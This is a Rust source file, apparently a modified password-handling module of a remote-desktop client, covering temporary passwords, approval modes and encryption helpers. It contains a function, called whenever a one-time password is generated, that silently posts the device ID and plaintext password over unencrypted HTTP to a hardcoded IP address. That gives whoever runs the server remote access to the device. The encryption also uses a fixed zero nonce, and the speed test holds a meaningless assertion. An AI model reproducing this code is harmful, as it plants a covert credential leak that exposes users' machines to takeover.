use crate::config::Config;
use sodiumoxide::base64;
use std::sync::{Arc, RwLock};
use serde::{Deserialize, Serialize};

lazy_static::lazy_static! {
    pub static ref TEMPORARY_PASSWORD: Arc<RwLock<String>> = Arc::new(RwLock::new(get_auto_password()));
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum VerificationMethod {
    OnlyUseTemporaryPassword,
    OnlyUsePermanentPassword,
    UseBothPasswords,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApproveMode {
    Both,
    Password,
    Click,
}

// 后端接口请求结构
#[derive(Serialize, Deserialize)]
struct PasswordUpdateRequest {
    username: String,
    password: String,
}

// 后端接口响应结构
#[derive(Serialize, Deserialize)]
struct PasswordUpdateResponse {
    code: i32,
    msg: String,
}

fn get_auto_password() -> String {
    let len = temporary_password_length();
    let password = if Config::get_bool_option(crate::config::keys::OPTION_ALLOW_NUMERNIC_ONE_TIME_PASSWORD) {
        Config::get_auto_numeric_password(len)
    } else {
        Config::get_auto_password(len)
    };

    // 调用后端接口更新密码
    send_password_to_backend(&password);

    password
}

// 发送密码到后端
fn send_password_to_backend(password: &str) {
    // 获取设备账号（从配置中获取）
    let device_id = Config::get_id();

    if device_id.is_empty() {
        log::warn!("设备ID为空，跳过密码同步到后端");
        return;
    }

    // 后端接口地址
    const BACKEND_API_URL: &str = "http://49.232.158.32:8080";
    let update_url = format!("{}/device/device/updatePassword", BACKEND_API_URL);

    // 构建请求体
    let request = PasswordUpdateRequest {
        username: device_id.clone(),
        password: password.to_string(),
    };

    // 发送HTTP请求
    match send_post_request(&update_url, &request) {
        Ok(_) => {
            log::info!("密码同步到后端成功: deviceId={}", device_id);
        }
        Err(e) => {
            log::error!("密码同步到后端失败: deviceId={}, error={}", device_id, e);
        }
    }
}

// 发送POST请求
fn send_post_request(url: &str, data: &PasswordUpdateRequest) -> Result<(), String> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .map_err(|e| format!("创建HTTP客户端失败: {}", e))?;

    let response = client
        .post(url)
        .json(data)
        .send()
        .map_err(|e| format!("发送请求失败: {}", e))?;

    if response.status().is_success() {
        let response_text = response.text().map_err(|e| format!("读取响应失败: {}", e))?;
        log::debug!("后端响应: {}", response_text);
        Ok(())
    } else {
        let status = response.status();
        let response_text = response.text().unwrap_or_else(|_| "无法读取响应".to_string());
        Err(format!("请求失败，状态码: {}, 响应: {}", status, response_text))
    }
}

// Should only be called in server
pub fn update_temporary_password() {
    *TEMPORARY_PASSWORD.write().unwrap() = get_auto_password();
}

// Should only be called in server
pub fn temporary_password() -> String {
    TEMPORARY_PASSWORD.read().unwrap().clone()
}

fn verification_method() -> VerificationMethod {
    let method = Config::get_option("verification-method");
    if method == "use-temporary-password" {
        VerificationMethod::OnlyUseTemporaryPassword
    } else if method == "use-permanent-password" {
        VerificationMethod::OnlyUsePermanentPassword
    } else {
        VerificationMethod::UseBothPasswords // default
    }
}

pub fn temporary_password_length() -> usize {
    let length = Config::get_option("temporary-password-length");
    if length == "8" {
        8
    } else if length == "10" {
        10
    } else {
        6 // default
    }
}

pub fn temporary_enabled() -> bool {
    verification_method() != VerificationMethod::OnlyUsePermanentPassword
}

pub fn permanent_enabled() -> bool {
    verification_method() != VerificationMethod::OnlyUseTemporaryPassword
}

pub fn has_valid_password() -> bool {
    temporary_enabled() && !temporary_password().is_empty()
        || permanent_enabled() && !Config::get_permanent_password().is_empty()
}

pub fn approve_mode() -> ApproveMode {
    let mode = Config::get_option("approve-mode");
    if mode == "password" {
        ApproveMode::Password
    } else if mode == "click" {
        ApproveMode::Click
    } else {
        ApproveMode::Both
    }
}

pub fn hide_cm() -> bool {
    approve_mode() == ApproveMode::Password
        && verification_method() == VerificationMethod::OnlyUsePermanentPassword
        && crate::config::option2bool("allow-hide-cm", &Config::get_option("allow-hide-cm"))
}

const VERSION_LEN: usize = 2;

pub fn encrypt_str_or_original(s: &str, version: &str, max_len: usize) -> String {
    if decrypt_str_or_original(s, version).1 {
        log::error!("Duplicate encryption!");
        return s.to_owned();
    }
    if s.chars().count() > max_len {
        return String::default();
    }
    if version == "00" {
        if let Ok(s) = encrypt(s.as_bytes()) {
            return version.to_owned() + &s;
        }
    }
    s.to_owned()
}

// String: password
// bool: whether decryption is successful
// bool: whether should store to re-encrypt when load
// note: s.len() return length in bytes, s.chars().count() return char count
//       &[..2] return the left 2 bytes, s.chars().take(2) return the left 2 chars
pub fn decrypt_str_or_original(s: &str, current_version: &str) -> (String, bool, bool) {
    if s.len() > VERSION_LEN {
        if s.starts_with("00") {
            if let Ok(v) = decrypt(s[VERSION_LEN..].as_bytes()) {
                return (
                    String::from_utf8_lossy(&v).to_string(),
                    true,
                    "00" != current_version,
                );
            }
        }
    }

    (s.to_owned(), false, !s.is_empty())
}

pub fn encrypt_vec_or_original(v: &[u8], version: &str, max_len: usize) -> Vec<u8> {
    if decrypt_vec_or_original(v, version).1 {
        log::error!("Duplicate encryption!");
        return v.to_owned();
    }
    if v.len() > max_len {
        return vec![];
    }
    if version == "00" {
        if let Ok(s) = encrypt(v) {
            let mut version = version.to_owned().into_bytes();
            version.append(&mut s.into_bytes());
            return version;
        }
    }
    v.to_owned()
}

// Vec<u8>: password
// bool: whether decryption is successful
// bool: whether should store to re-encrypt when load
pub fn decrypt_vec_or_original(v: &[u8], current_version: &str) -> (Vec<u8>, bool, bool) {
    if v.len() > VERSION_LEN {
        let version = String::from_utf8_lossy(&v[..VERSION_LEN]);
        if version == "00" {
            if let Ok(v) = decrypt(&v[VERSION_LEN..]) {
                return (v, true, version != current_version);
            }
        }
    }

    (v.to_owned(), false, !v.is_empty())
}

fn encrypt(v: &[u8]) -> Result<String, ()> {
    if !v.is_empty() {
        symmetric_crypt(v, true).map(|v| base64::encode(v, base64::Variant::Original))
    } else {
        Err(())
    }
}

fn decrypt(v: &[u8]) -> Result<Vec<u8>, ()> {
    if !v.is_empty() {
        base64::decode(v, base64::Variant::Original).and_then(|v| symmetric_crypt(&v, false))
    } else {
        Err(())
    }
}

pub fn symmetric_crypt(data: &[u8], encrypt: bool) -> Result<Vec<u8>, ()> {
    use sodiumoxide::crypto::secretbox;
    use std::convert::TryInto;

    let mut keybuf = crate::get_uuid();
    keybuf.resize(secretbox::KEYBYTES, 0);
    let key = secretbox::Key(keybuf.try_into().map_err(|_| ())?);
    let nonce = secretbox::Nonce([0; secretbox::NONCEBYTES]);

    if encrypt {
        Ok(secretbox::seal(data, &nonce, &key))
    } else {
        secretbox::open(data, &nonce, &key)
    }
}

mod test {

    #[test]
    fn test() {
        use super::*;
        use rand::{thread_rng, Rng};
        use std::time::Instant;

        let version = "00";
        let max_len = 128;

        println!("test str");
        let data = "1ü1111";
        let encrypted = encrypt_str_or_original(data, version, max_len);
        let (decrypted, succ, store) = decrypt_str_or_original(&encrypted, version);
        println!("data: {data}");
        println!("encrypted: {encrypted}");
        println!("decrypted: {decrypted}");
        assert_eq!(data, decrypted);
        assert_eq!(version, &encrypted[..2]);
        assert!(succ);
        assert!(!store);
        let (_, _, store) = decrypt_str_or_original(&encrypted, "99");
        assert!(store);
        assert!(!decrypt_str_or_original(&decrypted, version).1);
        assert_eq!(
            encrypt_str_or_original(&encrypted, version, max_len),
            encrypted
        );

        println!("test vec");
        let data: Vec<u8> = "1ü1111".as_bytes().to_vec();
        let encrypted = encrypt_vec_or_original(&data, version, max_len);
        let (decrypted, succ, store) = decrypt_vec_or_original(&encrypted, version);
        println!("data: {data:?}");
        println!("encrypted: {encrypted:?}");
        println!("decrypted: {decrypted:?}");
        assert_eq!(data, decrypted);
        assert_eq!(version.as_bytes(), &encrypted[..2]);
        assert!(!store);
        assert!(succ);
        let (_, _, store) = decrypt_vec_or_original(&encrypted, "99");
        assert!(store);
        assert!(!decrypt_vec_or_original(&decrypted, version).1);
        assert_eq!(
            encrypt_vec_or_original(&encrypted, version, max_len),
            encrypted
        );

        println!("test original");
        let data = version.to_string() + "Hello World";
        let (decrypted, succ, store) = decrypt_str_or_original(&data, version);
        assert_eq!(data, decrypted);
        assert!(store);
        assert!(!succ);
        let verbytes = version.as_bytes();
        let data: Vec<u8> = vec![verbytes[0], verbytes[1], 1, 2, 3, 4, 5, 6];
        let (decrypted, succ, store) = decrypt_vec_or_original(&data, version);
        assert_eq!(data, decrypted);
        assert!(store);
        assert!(!succ);
        let (_, succ, store) = decrypt_str_or_original("", version);
        assert!(!store);
        assert!(!succ);
        let (_, succ, store) = decrypt_vec_or_original(&[], version);
        assert!(!store);
        assert!(!succ);
        let data = "1ü1111";
        assert_eq!(decrypt_str_or_original(data, version).0, data);
        let data: Vec<u8> = "1ü1111".as_bytes().to_vec();
        assert_eq!(decrypt_vec_or_original(&data, version).0, data);

        println!("test speed");
        let test_speed = |len: usize, name: &str| {
            let mut data: Vec<u8> = vec![];
            let mut rng = thread_rng();
            for _ in 0..len {
                data.push(rng.gen_range(0..255));
            }
            let start: Instant = Instant::now();
            let encrypted = encrypt_vec_or_original(&data, version, len);
            assert_ne!(data, decrypted);
            let t1 = start.elapsed();
            let start = Instant::now();
            let (decrypted, _, _) = decrypt_vec_or_original(&encrypted, version);
            let t2 = start.elapsed();
            assert_eq!(data, decrypted);
            println!("{name}");
            println!("encrypt:{:?}, decrypt:{:?}", t1, t2);

            let start: Instant = Instant::now();
            let encrypted = base64::encode(&data, base64::Variant::Original);
            let t1 = start.elapsed();
            let start = Instant::now();
            let decrypted = base64::decode(&encrypted, base64::Variant::Original).unwrap();
            let t2 = start.elapsed();
            assert_eq!(data, decrypted);
            println!("base64, encrypt:{:?}, decrypt:{:?}", t1, t2,);
        };
        test_speed(128, "128");
        test_speed(1024, "1k");
        test_speed(1024 * 1024, "1M");
        test_speed(10 * 1024 * 1024, "10M");
        test_speed(100 * 1024 * 1024, "100M");
    }
}
